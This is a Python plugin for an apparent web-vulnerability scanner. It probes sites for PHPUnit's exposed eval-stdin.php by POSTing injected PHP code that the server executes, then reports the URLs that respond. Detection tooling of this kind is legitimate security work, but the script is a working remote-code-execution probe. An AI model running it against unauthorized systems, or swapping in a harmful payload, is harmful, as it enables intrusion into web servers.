#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    phpunit rce文件泄露扫描
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.file_list = [
            "phpunit/src/Util/PHP/eval-stdin.php",
            "phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        ]

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                data = '<?=show_source("eval-stdin.php");?>'
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        for file in self.file_list:
                            url = path + file
                            try:
                                async with session.post(url=url, data=data, allow_redirects=False) as res:
                                    if res:
                                        text = await res.text()
                                        if text and 'php://input' in text.lower():
                                            yield url
                            except:
                                pass